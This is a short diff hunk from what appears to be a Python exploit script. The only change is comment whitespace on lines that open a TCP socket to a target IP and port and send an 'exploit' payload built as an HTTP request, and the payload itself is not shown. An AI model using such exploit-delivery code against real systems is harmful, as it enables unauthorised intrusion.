@@ -70,5 +70,5 @@ exploit = (	"GET / HTTP/1.1" + "\r\n" +
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		# Declare a TCP socket
-sock.connect((target_ip, int(target_port)))						# Connect to target host
-sock.sendall(exploit)											# Send the exploit over TCP to the nominated addresses
+sock.connect((target_ip, int(target_port)))				# Connect to target host
+sock.sendall(exploit)							# Send the exploit over TCP to the nominated addresses
